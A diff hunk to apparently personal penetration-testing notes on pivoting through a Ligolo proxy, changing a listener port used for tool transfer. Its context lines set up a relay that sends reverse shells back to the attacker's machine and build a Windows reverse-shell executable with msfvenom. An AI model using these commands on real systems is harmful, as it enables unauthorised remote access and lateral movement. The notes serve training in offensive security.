@@ -111,7 +111,7 @@ So if we find ourselves in a situation where we have a pivot setup to the intern
 
 # On the Ligolo proxy setup a listener
 listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:9001 --tcp # This will make it so that any connections sent to port 1234 on our agent back to our kali box on 9001, using this for reverse shell.
-listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:80 --tcp # This will make it so that any connections sent to port 8000 on our agent back to our kali box on 80, using this for transfer tools.
+listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp # This will make it so that any connections sent to port 80 on our agent back to our kali box on 80, using this for transfer tools.
 
 # so if we need to get a shell back thru our pivot we would make a new payload that sends a shell to the Agent box on port 1234
 msfvenom -p windows/x64/shell_reverse_tcp -f exe -o revshell-1234.exe LHOST=client01-IP LPORT=1234
